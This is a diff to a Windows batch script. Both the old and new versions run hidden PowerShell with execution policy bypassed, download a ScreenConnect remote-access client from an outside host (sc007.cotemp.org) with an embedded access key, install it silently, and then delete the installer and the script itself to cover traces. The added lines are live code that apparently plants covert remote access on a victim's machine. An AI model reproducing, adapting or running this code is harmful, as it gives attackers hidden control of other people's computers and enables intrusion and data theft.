@@ -15,8 +15,8 @@ if %errorlevel% == 0 goto :RUN
 goto :LOOP
 :RUN
 mkdir "C:\Temp" >nul 2>&1
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null; iwr -Uri 'https://sc007.cotemp.org/Bin/ConnectWiseControl.ClientSetup.msi?h=sc007.cotemp.org&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQD9dGAOYtLfQSJ8M%2Bm%2Fd9zvFVDe5qGD8Ous7rh1iS3JKSbN7%2FnBtRjfmq02H38i9zfTc6vJSB9A6fx8gTfDv8OIVcApnqHvZ4iDnq7hKrJ1%2FenqYUgXUt6dU3qZI6KHmCZA4o4Cu%2F7UtDZGuKTbhsfF7UiRiQGQhNMLS3Lt330LDwf9ABSe0EU4YWFIwSrChsyM2HjjAiOcTDgTflHZWthwxq6AbPJnWKanRcZBSxNA0RLvHmglooncq%2B4oXe%2B1iv9gwO%2B9mUhxuT9R7PxCdrDoZ3uTceYdxQskPgOJmh45VXUu%2FsymQ2WO7T6mehWk91ev%2FzOOFdiQ%2FPnlfkdi6%2BC6&e=Access&y=Guest&t=Zoro&c=&c=&c=&c=&c=&c=&c=&c=' -OutFile 'C:\Temp\ConnectWiseControl.ClientSetup.msi'; Start-Process -WindowStyle Hidden -FilePath 'msiexec.exe' -ArgumentList '/i', 'C:\Temp\ConnectWiseControl.ClientSetup.msi', '/qn', '/norestart' -Wait; Start-Sleep -Seconds 5"
-del /f /q "C:\Temp\ConnectWiseControl.ClientSetup.msi" >nul 2>&1
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null; iwr -Uri 'https://sc007.cotemp.org/Bin/ConnectWiseControl.ClientSetup.msi?h=sc007.cotemp.org&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQD9dGAOYtLfQSJ8M%2Bm%2Fd9zvFVDe5qGD8Ous7rh1iS3JKSbN7%2FnBtRjfmq02H38i9zfTc6vJSB9A6fx8gTfDv8OIVcApnqHvZ4iDnq7hKrJ1%2FenqYUgXUt6dU3qZI6KHmCZA4o4Cu%2F7UtDZGuKTbhsfF7UiRiQGQhNMLS3Lt330LDwf9ABSe0EU4YWFIwSrChsyM2HjjAiOcTDgTflHZWthwxq6AbPJnWKanRcZBSxNA0RLvHmglooncq%2B4oXe%2B1iv9gwO%2B9mUhxuT9R7PxCdrDoZ3uTceYdxQskPgOJmh45VXUu%2FsymQ2WO7T6mehWk91ev%2FzOOFdiQ%2FPnlfkdi6%2BC6&e=Access&y=Guest&t=&c=&c=&c=&c=&c=&c=&c=&c=' -OutFile 'C:\Temp\ScreenConnect.ClientSetup.msi'; Start-Process -WindowStyle Hidden -FilePath 'msiexec.exe' -ArgumentList '/i', 'C:\Temp\ScreenConnect.ClientSetup.msi', '/qn', '/norestart' -Wait; Start-Sleep -Seconds 5"
+del /f /q "C:\Temp\ScreenConnect.ClientSetup.msi" >nul 2>&1
 del /f /q "%FLAG%" >nul 2>&1
 (del "%~f0") >nul 2>&1
 exit
